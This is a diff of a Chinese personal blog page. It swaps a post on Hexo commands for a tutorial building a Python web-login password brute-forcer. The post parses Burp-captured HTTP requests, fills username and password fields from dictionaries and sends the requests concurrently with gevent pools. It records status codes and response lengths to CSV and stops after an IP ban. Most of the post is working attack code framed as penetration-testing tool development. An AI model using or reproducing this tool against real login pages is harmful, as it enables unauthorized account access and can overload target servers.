@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>hexo相关 | qwrdxer &#39;s blog</title>
-  <meta name="keywords" content=" 工具使用 , 脚本 ">
-  <meta name="description" content="hexo相关 | qwrdxer &#39;s blog">
+  <title>web页面密码爆破 | qwrdxer &#39;s blog</title>
+  <meta name="keywords" content=" 渗透测试 , 工具开发 ">
+  <meta name="description" content="web页面密码爆破 | qwrdxer &#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Tags">
@@ -813,9 +813,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-开发工具/hexo命令" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-写点好玩的/web页面密码爆破" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">hexo相关</h1>
+        <h1 class="article-title">web页面密码爆破</h1>
     
     <div class="article-meta">
         
@@ -825,7 +825,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="开发工具">开发工具</a>
+            <a  data-rel="写点好玩的">写点好玩的</a>
             
         </span>
         
@@ -833,21 +833,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">工具使用</a>
+            <a class="color5">渗透测试</a>
             
-            <a class="color3">脚本</a>
+            <a class="color5">工具开发</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-01-06 18:05:35'>2021-04-16 12:12</time>
+            Created At : <time class="date" title='Updated At: 2023-09-27 19:55:29'>2022-01-11 10:21</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:385</span>
+        <span>Count:3.9k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -866,7 +866,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E7%AB%A0%E7%9B%B8%E5%85%B3"><span class="toc-text">文章相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%8D%A2"><span class="toc-text">主题更换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0"><span class="toc-text">本地图片上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2"><span class="toc-text">参考博客</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-amp-%E5%88%86%E6%9E%90"><span class="toc-text">一.工具介绍&amp;分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">工具使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0"><span class="toc-text">二.功能实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-text">1. 数据包的获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E8%A6%81%E7%88%86%E7%A0%B4%E7%9A%84%E5%8F%82%E6%95%B0-%E7%94%9F%E6%88%90payload"><span class="toc-text">2.修改数据包中要爆破的参数,生成payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-text">3.多线程发送数据包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BF%9D%E5%AD%98%E7%BB%93%E6%9E%9C%E5%88%B0%E6%96%87%E4%BB%B6%E4%B8%AD"><span class="toc-text">4. 保存结果到文件中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BC%98%E5%8C%96%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92-amp-%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96"><span class="toc-text">5. 优化用户交互 &amp; 代码优化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%90%8E%E7%BB%AD%E4%BC%98%E5%8C%96"><span class="toc-text">三.后续优化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-JSON%E6%A0%BC%E5%BC%8F%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE"><span class="toc-text">1. JSON格式传输数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%A2%ABban-IP%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">2.被ban IP的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C%E4%BC%98%E5%8C%96"><span class="toc-text">3. 输出结果优化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%92%89%E9%92%89%E6%8F%90%E9%86%92"><span class="toc-text">4. 钉钉提醒</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -882,44 +882,424 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#生成静态文件并重新部署</span><br><span class="line">hexo g -d</span><br><span class="line"></span><br><span class="line"># 本地测试 访问http://localhost:<span class="number">4000</span>/</span><br><span class="line">hexo s</span><br><span class="line"></span><br><span class="line">#更换主题时运行一次</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line"># 创建一篇文章，”“内填写文章的名字</span><br><span class="line">hexo new &quot;blogname&quot;</span><br><span class="line"></span><br><span class="line"># 指定目录创建文件</span><br><span class="line">hexo new &quot;titlename&quot; -p &quot;<span class="built_in">path</span>\titlename&quot;</span><br></pre></td></tr></table></figure>
-
+        <h2 id="一-工具介绍-amp-分析"><a href="#一-工具介绍-amp-分析" class="headerlink" title="一.工具介绍&amp;分析"></a>一.工具介绍&amp;分析</h2><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先带有验证码、以及密码前端加密的登录页面先不做讨论。</p>
+<p>常规的密码爆破为: </p>
+<blockquote>
+<p>页面输入用户名密码-&gt; burpsuite 抓包-&gt; 标记要爆破的位置-&gt; 导入字典 -&gt; 开始爆破 -&gt; 分析数据包是否爆破成功</p>
+</blockquote>
+<p>​    虽然整个流程大部分都可通过脚本进行实现，但关键的 <strong>标记要爆破的位置</strong> 却很难实现，这需要去考虑其提交的表单参数中，哪个是用户名，哪个是密码且两者不能颠倒。</p>
+<p>​    因此目前来看，完全的自动化只能处理一部分很“标准化”的登录框，比如页面只有一个表单，且用户名中包含user ,密码中包含password，这种页面通过正则表达式可以很容易实现完全的自动化，awvs都内置这种简单的弱口令自动检测</p>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220111114821463.png" alt="image-20220111114821463"></p>
+<p>网上也有大佬编写的现成的工具。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yzddmr6/WebCrack">https://github.com/yzddmr6/WebCrack</a></p>
+<p>​    但这种方式并不能覆盖全部的网页，较为复杂的网页登录框还是需要<strong>人为</strong>的进行筛选、标记参数，进行一种半自动化的爆破。</p>
+<ol>
+<li>登录框输入固定的标记：如用户名为qwrdxeradmin,密码为qwrdxerpassword，这两个参数固定，且数据包中不能有同样的字段出现。</li>
+<li>抓包，保存</li>
+<li>使用工具匹配到数据包中用户名和密码的位置 ，用字典替换内容，发送数据包</li>
+<li>保存请求和响应的三个关键数据 ： 字典值、状态码、响应数据包大小。</li>
+</ol>
 <p><em><span id="more"></span></em> </p>
-<h3 id="文章相关"><a href="#文章相关" class="headerlink" title="文章相关"></a>文章相关</h3><blockquote>
-<p>使用hexo new “blog” 命令会在_post文件夹下生成blog.md,在头部有如下配置</p>
-<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20210416123314164.png" alt="image-20210416123314164"></p>
-<p>可以增加自定义设置</p>
-</blockquote>
-<p><code>tags示例</code></p>
+<p>​    综上，目前实现的脚本需要实现以下功能：</p>
+<ol>
+<li>爆破用户名 和爆破密码可自定义，默认使用10个常用用户名+3000字典（也就是每个url需要发送30000个数据包)</li>
+<li>如果指定爆破密码或用户名，可选择使用较大的字典。</li>
+<li>对每个请求的响应数据包进行 分析，保留关键数据。</li>
+</ol>
+<h2 id="二-功能实现"><a href="#二-功能实现" class="headerlink" title="二.功能实现"></a>二.功能实现</h2><h3 id="1-数据包的获取"><a href="#1-数据包的获取" class="headerlink" title="1. 数据包的获取"></a>1. 数据包的获取</h3><p>​    因为数据包是在burp中复制的，因此最好能直接解析文本格式的数据包，然后在数据包中用户名或密码位置填入数据，发送数据包。</p>
+<p>​    这篇文章给了一个很好的思路:<a target="_blank" rel="noopener" href="https://blog.csdn.net/haoren_xhf/article/details/104937390">https://blog.csdn.net/haoren_xhf/article/details/104937390</a></p>
+<ol>
+<li>读入数据包</li>
+<li>在数据包中，第一行有三个重要的信息: 请求的方法(POST / GET  ,一般为POST提交)、请求的目录 、请求的HTTP协议版本，因此对第一行数据可读入请求的类型。</li>
+<li>后续行中，大部分为请求头信息，不做修改直接读入即可。</li>
+<li>POST提交中，最后一行为POST提交的数据，也就是用户名密码 ，我们需要在这里填入字典，重新发送数据。</li>
+</ol>
+<pre><code class="http">POST /fileadmin/index.php? HTTP/1.1
+Host: 123.345.567.123
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Connection: close
+Cookie: PHPSESSID=qkivqmbgbiomaum26df44ucsv4
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+username=admin123&amp;password=admin123
+</code></pre>
+<p>然后分析一下文章中的关键代码</p>
+<pre><code class="python">import requests, urllib3
+import sys, os
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)# 禁用https协议报错
+def sender(content, allowredirect=True):
+    method = &#39;get&#39;
+    url = &#39;&#39;
+    headers = &#123;&#125;
+    correct = True
+    data = &#39;&#39;
+    lines = content.strip().split(&#39;\n&#39;)
+    for key, line in enumerate(lines):
+        if key == 0: # 第一行数据需要单独处理，获取请求头数据
+            tmp = line.strip().split()
+            if len(tmp) != 3:
+                print(&#39;第一行错误 &#39; + line)
+                correct = False
+                break
+            method = tmp[0].lower() # 这里获取到请求是POST或是GET
+            url = tmp[1]
+        elif method == &#39;post&#39; and key == len(lines) - 1:# 最后一行数据为POST提交的数据，进行单独的处理
+            data = line.strip()
+        elif line: # 其他行尾请求头数据，统一处理即可
+            tmp = line.strip().split(&#39;:&#39;)
+            if len(tmp) &lt; 2:
+                correct = False
+                print(&#39;headers error &#39; + line)
+                break
+            tmp[1] = tmp[1].strip()
+            headers[tmp[0].lower()] = &#39;:&#39;.join(tmp[1:])
+
+    if correct:
+        if not url.startswith(&#39;http:&#39;) and not url.startswith(&#39;https:&#39;):
+            url = &#39;http://&#39; + headers.get(&#39;host&#39;) + url
+
+        return requests.request(**&#123;
+            &#39;url&#39;: url,
+            &#39;data&#39;: data,
+            &#39;verify&#39;: False,
+            &#39;method&#39;: method,
+            &#39;headers&#39;: headers,
+            &#39;allow_redirects&#39;: allowredirect,
+        &#125;)
+
+content = &#39;&#39;&#39;
+POST /fileadmin/index.php? HTTP/1.1
+Host: 123.345.567.123
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Connection: close
+Cookie: PHPSESSID=qkivqmbgbiomaum26df44ucsv4
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+username=admin123&amp;password=admin123
+
+&#39;&#39;&#39;
+print(sender(content).text)
+</code></pre>
+<h3 id="2-修改数据包中要爆破的参数-生成payload"><a href="#2-修改数据包中要爆破的参数-生成payload" class="headerlink" title="2.修改数据包中要爆破的参数,生成payload"></a>2.修改数据包中要爆破的参数,生成payload</h3><p>​    文中代码是重新发送数据包，但要爆破密码，需要对数据包中POST提交的数据进行修改。    </p>
+<p>​    因此需要定义一个如下函数，第一个参数为封装好的数据包，第二个参数为POST提交的数据、后续需要对数据进行字典替换、后面两个决定是否爆破用户名或密码。</p>
+<p>​    中间过程为字典替换，发送数据包，记录payload 、响应数据包中状态码、响应数据包长度。</p>
+<pre><code class="python">def enumerator(package,data,username=False,password=True)
+    ...
+    return status_code payload length
+</code></pre>
+<p>​    具体实现代码如下:</p>
 <blockquote>
-<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20210416123455874.png" alt="image-20210416123455874"></p>
-<p>可以为文章添加多个tags</p>
+<p>字典替换: </p>
+<p>也即是在数据包中最后一行</p>
+<p>username=qwrdxername&amp;password=qwrdxername</p>
+<p>我们要将其中的qwrdxername和qwrdxername 进行字典替换，</p>
 </blockquote>
-<p><code>categories示例</code></p>
-<blockquote>
-<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20210416123611813.png"></p>
-<p>可将文章归为多个类别</p>
+<pre><code class="python">def generate_payload(usernameandpassowrd=&quot;yonghuming=qwrdxername&amp;mima=qwrdxerpasswd&amp;session=DAWAWRFWAFAWEDF&amp;test=testets&quot;):
+    tmpvar=usernameandpassowrd.split(&quot;&amp;&quot;) #临时存储用户名和密码
+    payloadlist=[]
+    tmpdic=&#123;&#125;
+    user=&quot;&quot;
+    passwd=&quot;&quot;
+    payloadtemple=&quot;&quot;
+    for i in tmpvar:#在post提交表单中可能有其他数据，因此现将键值对存入字典中，然后将username和passwd提出来
+        print(i)
+        tmpdic[i.split(&#39;=&#39;)[1]]=i.split(&#39;=&#39;)[0]
+
+    print(tmpdic)
+    # 获取到两个表单中的参数名
+    user=tmpdic[&#39;qwrdxername&#39;]
+    passwd=tmpdic[&#39;qwrdxerpasswd&#39;]
+    del tmpdic[&#39;qwrdxername&#39;]
+    del tmpdic[&#39;qwrdxerpasswd&#39;]
+    # 生成payload
+    for i in tmpdic.keys():# 除用户名密码外其他固定参数装入payload中
+        payloadtemple+=tmpdic[i]+&quot;=&quot;+i+&quot;&amp;&quot;
+
+    for username in open(&quot;dictionary/username.txt&quot;,&quot;r&quot;,encoding=&#39;UTF-8-sig&#39;):
+        for password in open(&quot;dictionary/password.txt&quot;, &quot;r&quot;,encoding=&#39;UTF-8-sig&#39;):
+            if payloadtemple!=&quot;&quot;:
+                payloadlist.append(payloadtemple+&quot;&amp;&quot;+user+&quot;=&quot;+username.strip()+&quot;&amp;&quot;+passwd+&quot;=&quot;+password.strip())
+            else:
+                payloadlist.append(user + &quot;=&quot; + username.strip() + &quot;&amp;&quot; + passwd + &quot;=&quot; + password.strip())
+    return payloadlist
+</code></pre>
+<h3 id="3-多线程发送数据包"><a href="#3-多线程发送数据包" class="headerlink" title="3.多线程发送数据包"></a>3.多线程发送数据包</h3><p>至此主体已实现</p>
+<pre><code class="python">for i in payload:
+    send_request(url,i,headers,method)
+    
+def send_request(url,payload,headers,method):
+    #发送数据包
+    resp=requests.request(**&#123;
+        &#39;url&#39;: url,
+        &#39;data&#39;: payload,
+        &#39;verify&#39;: False,
+        &#39;method&#39;: method,
+        &#39;headers&#39;: headers,
+        &#39;allow_redirects&#39;: True,
+        # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+    &#125;)
+    print(payload,resp.status_code,len(resp.text))
+</code></pre>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112155302102.png" alt="image-20220112155302102"></p>
+<p>但发送速度过于缓慢，几个用户名+ 千级别字典，一个目标就需要几十分钟乃至几个小时。</p>
+<p>需要对发包进行改进，进行多线程发包。百度翻阅一下，gevent库是个不错的选择</p>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112165914143.png" alt="image-20220112165914143"></p>
+<p>如下图，使用多线程发送了九个数据包，可见速度提升很大</p>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112165720892.png" alt="image-20220112165720892"></p>
+<p>发送100个数据包，输出如下</p>
+<pre><code class="shell">使用gevent
+该循环程序运行时间： 1.4333410263061523
+
+使用普通for循环
+该循环程序运行时间： 78.70576453208923
+</code></pre>
+<p>最初版本核心代码如下:</p>
+<pre><code class="python">import gevent
+from gevent import socket
+from  gevent import  monkey
+monkey.patch_all()  # 加上这个补丁瞬间变快了 - -
+url, payloads, headers, method = generate_param(content) #上文中生成payload的代码
+
+jobs=[]
+begin_time = time()
+for payload in payloads:
+    jobs.append(gevent.spawn(send_request, url, payload, headers, method))
+gevent.joinall(jobs, timeout=5)
+
+
+#发送数据包
+def send_request(url,payload,headers,method):
+    #发送数据包
+    resp=requests.request(**&#123;
+        &#39;url&#39;: url,
+        &#39;data&#39;: payload,
+        &#39;verify&#39;: False,
+        &#39;method&#39;: method,
+        &#39;headers&#39;: headers,
+        &#39;allow_redirects&#39;: True,
+        # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+    &#125;)
+    print(payload,resp.status_code,len(resp.text))
+</code></pre>
+<p>程序获取到payload列表以及其他参数后，使用for循环遍历payloads，为每一个payload分配一个 send_request的job ，然后调用gevent.joinall ，他会自动调用这些job。</p>
+<p>在vps上运行，感觉还不错</p>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112170919713.png" alt="image-20220112170919713"></p>
+<p>然后就是限制一下并发运行数，防止目标宕机。</p>
+<p>百度到了这篇文章，<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012206617/article/details/108059173">https://blog.csdn.net/u012206617/article/details/108059173</a></p>
+<p>也就是说可以通过gevent.pool 里面的Pool类来实现。</p>
+<p>修改部分代码如下</p>
+<pre><code class="python">from gevent.pool import Pool#  导入类
+
+p = Pool(2)  # 创建一个Pool对象，参数为最大并发的携程数
+for payload in payloads:
+    print(payload)
+    # 在添加job时，使用的是p对象
+    jobs.append(p.spawn(send_request, url, payload, headers, method))
+
+    # 正常启动即可
+gevent.joinall(jobs, timeout=5)
+</code></pre>
+<p>测试发包时间如下:</p>
+<pre><code class="python">Pool(2)  2用户名X 100密码
+该循环程序运行时间： 58.2290563583374
+Pool(5)  2用户名X 100密码
+该循环程序运行时间： 23.66639494895935
+Pool(10)  2用户名X 100密码
+该循环程序运行时间： 11.918724298477173
+</code></pre>
+<p>设置成5~10个左右就可以了</p>
+<h3 id="4-保存结果到文件中"><a href="#4-保存结果到文件中" class="headerlink" title="4. 保存结果到文件中"></a>4. 保存结果到文件中</h3><p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112205300007.png" alt="image-20220112205300007"></p>
+<p>在burpsuite 爆破中，我们主要关注的是Payload 、状态码、响应长度， 因此在代码中要实现的是结果保存、具有排序功能。</p>
+<p>因此可以保存到Excel表格中，方便排序。</p>
+<p><strong>关键点在于: 并发的请求如何写入同一个文件中</strong></p>
+<p>两种思路:</p>
+<p>方法一: 创建一个列表变量存储结果，引入 锁，同一时间只能有一个协程访问该列表</p>
+<p>方法二: 每一个数据包保存为一个文件，在全部请求结束后，单独调用一个函数来将这些文件整合到一起。</p>
+<p>感觉方法一好一点，gevent的锁在gevent.lock里，对发送数据包函数进行 修改如下。</p>
+<pre><code class="python">def sender(url,payloads,headers,method):
+    sem = BoundedSemaphore(1) #锁
+    result=[]
+
+    jobs = []
+    p = Pool(10)
+    for payload in payloads:
+        print(payload)
+        jobs.append(p.spawn(send_request, url, payload, headers, method,result,sem))
+    gevent.joinall(jobs, timeout=5)
+    print(len(result))
+
+
+def send_request(url,payload,headers,method,result,sem):
+    #发送数据包
+    resp=requests.request(**&#123;
+        &#39;url&#39;: url,
+        &#39;data&#39;: payload,
+        &#39;verify&#39;: False,
+        &#39;method&#39;: method,
+        &#39;headers&#39;: headers,
+        &#39;allow_redirects&#39;: True,
+        # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+    &#125;)
+    sem.acquire()
+    result.append([payload,resp.status_code,len(resp.text)])
+    sem.release()
+</code></pre>
+<p>sender函数用于发送数据包，</p>
+<p>首先创建一个锁sem = BoundedSemaphore(1) ， 参数为1 意味着同一时间只能有一个协程获得锁</p>
+<p>result列表用于记录结果</p>
+<p>send_reques函数最后两个参数为锁和用于结果保存的变量，请求完成之后会将关键信息写入result中，为了防止多协程访问导致变量异常，引入了锁。</p>
+<pre><code>sem.acquire()
+result.append([payload,resp.status_code,len(resp.text)])
+sem.release()
+</code></pre>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112213910373.png" alt="image-20220112213910373"></p>
+<p>然后是创建一个函数保存结果到文件中。</p>
+<pre><code class="python">import csv
+def  savecsv(result):
+    f = open(&#39;222.csv&#39;, &#39;w&#39;)
+    writer = csv.writer(f)
+    for i in result:
+        writer.writerow(i)
+    f.close()
+</code></pre>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112231551862.png" alt="image-20220112231551862"></p>
+<p>成功</p>
+<h3 id="5-优化用户交互-amp-代码优化"><a href="#5-优化用户交互-amp-代码优化" class="headerlink" title="5. 优化用户交互 &amp; 代码优化"></a>5. 优化用户交互 &amp; 代码优化</h3><p>从使用的角度来看，需要支持以下功能</p>
+<pre><code class="shell">python  xxx.py    直接运行，会对存放目录的数据包进行批量检测。
+
+-p  password.txt  可以指定自定义字典。
+
+-u  username.txt 可以指定用户名字典。
+
+输出结果的文件为指定IP+文件后缀。
+
+进程控制：可以指定协程的数量( 默认为5)。
+
+错误控制: 如数据包中没找到用户名和密码字段，会直接报错，退出程序。
+</code></pre>
+<p>获取用户参数代码如下</p>
+<pre><code class="python">import argparse
+
+
+def parser():
+    parser = argparse.ArgumentParser()
+    parser.description = &#39;可指定用户名和密码字典、线程数量&#39;
+    parser.add_argument(&quot;-t&quot;, &quot;--thread&quot;, help=&quot;指定协程数，默认为5&quot;, dest=&quot;tnum&quot;, type=int, default=&quot;5&quot;)
+    parser.add_argument(&quot;-p&quot;, &quot;--password&quot;, help=&quot;指定自定义字典路径&quot;, dest=&quot;ppath&quot;, type=str, default=&quot;dictionary/password.txt&quot;)
+    args = parser.parse_args()
+    return args
+</code></pre>
+<h2 id="三-后续优化"><a href="#三-后续优化" class="headerlink" title="三.后续优化"></a>三.后续优化</h2><h3 id="1-JSON格式传输数据"><a href="#1-JSON格式传输数据" class="headerlink" title="1. JSON格式传输数据"></a>1. JSON格式传输数据</h3><p>实际测试中有一部分目标使用的是JSON格式传输，其数据字段如下</p>
+<pre><code class="shell">&#123;&quot;code&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;referer&quot;:&quot;index.html&quot;&#125;
+</code></pre>
+<p>尝试使用字符串的replace方法来进行payload生成、</p>
+<pre><code class="python"># 因为有的数据是通过JSON传输的，因此考虑使用正则匹配
+def generate_payload_v2(usernameandpassowrd=&quot;yonghuming=qwrdxername&amp;mima=qwrdxerpasswd&amp;session=DAWAWRFWAFAWEDF&amp;test=testets&quot;):
+
+    payloadlist=[]
+    for username in open(&quot;dictionary/username.txt&quot;,&quot;r&quot;,encoding=&#39;UTF-8-sig&#39;):
+        for password in open(&quot;dictionary/password.txt&quot;, &quot;r&quot;,encoding=&#39;UTF-8-sig&#39;):
+            tmp=usernameandpassowrd
+            tmp2=tmp.replace(&quot;qwrdxername&quot;,username.strip())
+            tmp3=tmp2.replace(&quot;qwrdxerpassword&quot;,password.strip())
+            payloadlist.append(tmp3)
+    print(&quot;payload个数为:%d&quot;%len(payloadlist))
+    return payloadlist
+</code></pre>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220113105029956.png" alt="image-20220113105029956"></p>
+<p>性能居然提升了。</p>
+<h3 id="2-被ban-IP的问题"><a href="#2-被ban-IP的问题" class="headerlink" title="2.被ban IP的问题"></a>2.被ban IP的问题</h3><p>实际应用中。测试了一个目标，扫描太快被封禁了，但那几千个协程还是要执行啊， 每一个等待5秒肯定不行的</p>
+<p>需求: 如果目标返回无法建立连接，将gevent创建的所有协程kill掉</p>
+<pre><code class="python">requests.exceptions.ConnectionError: HTTPConnectionPool(host=&#39;&#39;, port=80): Max retries exceeded with url: 
+</code></pre>
+<p> 用到gevent.killall 来关闭</p>
+<p>对发包代码修改如下</p>
+<pre><code class="python">def send_request(url,payload,headers,method,result,sem):
+    try:
+        resp = requests.request(**&#123;
+            &#39;url&#39;: url,
+            &#39;data&#39;: payload,
+            &#39;verify&#39;: False,
+            &#39;method&#39;: method,
+            &#39;headers&#39;: headers,
+            &#39;allow_redirects&#39;: True,
+            # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+        &#125;)
+        # 好像不加锁也不会报错，疑惑
+        sem.acquire()
+        result.append([payload, resp.status_code, len(resp.text)])
+        sem.release()
+    except requests.exceptions.ConnectionError:
+        print(&quot;已被目标IP封&quot;)
+</code></pre>
+<p>经测试，以上方法行不通，问题可能出现在for循环，</p>
+<p>另一种思路: 引入一个控制信号量 controller </p>
+<ol>
+<li>协程发包前检查这个变量，若值为1，不发包退出。</li>
+<li>若值为0，进行发包操作。</li>
+<li>如果发包过程中产生了异常，设置这个信号量为1 。</li>
+</ol>
+<p>在python中没有指针，用列表记录信号量</p>
+<pre><code class="python">def send_request(url,payload,headers,method,result,sem,controller):
+    try:
+        if controller[0]==1:# 若值为1，不发包退出。
+            print(&quot;目标已down&quot;)
+            return
+        
+        resp = requests.request(**&#123;
+            &#39;url&#39;: url,
+            &#39;data&#39;: payload,
+            &#39;verify&#39;: False,
+            &#39;method&#39;: method,
+            &#39;headers&#39;: headers,
+            &#39;allow_redirects&#39;: True,
+            # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+        &#125;)
+        # 好像不加锁也不会报错，疑惑
+        sem.acquire()
+        result.append([payload, resp.status_code, len(resp.text)])
+        sem.release()
+    except requests.exceptions.ConnectionError:
+        print(&quot;已被目标IP封&quot;)
+        controller[0]=1#如果发包过程中产生了异常，设置这个信号量为1 。
+</code></pre>
+<p>基本完成了功能需求</p>
+<h3 id="3-输出结果优化"><a href="#3-输出结果优化" class="headerlink" title="3. 输出结果优化"></a>3. 输出结果优化</h3><p>输出为CSV，在burpsutie爆破中，一般是对返回值和返回长度进行排序，但csv并没有排序功能，因此需要在开发一个小脚本对输出结果进行处理，生成按返回值排序和按长度排序的结果，方便对比查看。</p>
+<h3 id="4-钉钉提醒"><a href="#4-钉钉提醒" class="headerlink" title="4. 钉钉提醒"></a>4. 钉钉提醒</h3><blockquote>
+<p>参考</p>
+<p>web页面</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yzddmr6/WebCrack">https://github.com/yzddmr6/WebCrack</a></p>
+<p>python与Burp Suite联动暴力破解 </p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260406.html">https://www.freebuf.com/articles/web/260406.html</a><br>python解析http包并发送:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/haoren_xhf/article/details/104937390">https://blog.csdn.net/haoren_xhf/article/details/104937390</a></p>
+<p>[[图灵程序设计丛书].Python语言及其应用  第十一章</p>
+<p>Gevent介绍</p>
